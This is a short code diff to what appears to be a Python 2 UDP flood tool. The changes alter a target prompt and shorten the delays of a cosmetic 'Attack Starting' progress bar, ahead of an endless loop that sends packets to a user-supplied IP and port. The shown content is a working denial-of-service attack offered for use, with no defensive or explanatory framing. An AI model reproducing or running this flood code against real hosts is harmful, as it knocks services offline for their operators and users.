@@ -25,21 +25,21 @@ print "You Tube : https://www.youtube.com/c/HA-MRX"
 print "github   : https://github.com/Ha3MrX"
 print "Facebook : https://www.facebook.com/muhamad.jabar222"
 print
-ip = raw_input("IP Target : ")
+ip = raw_input("IP Target Target URl : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(2)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(2)
 print "[==========          ] 50%"
-time.sleep(5)
+time.sleep(2)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(2)
 print "[====================] 100%"
-time.sleep(3)
+time.sleep(2)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
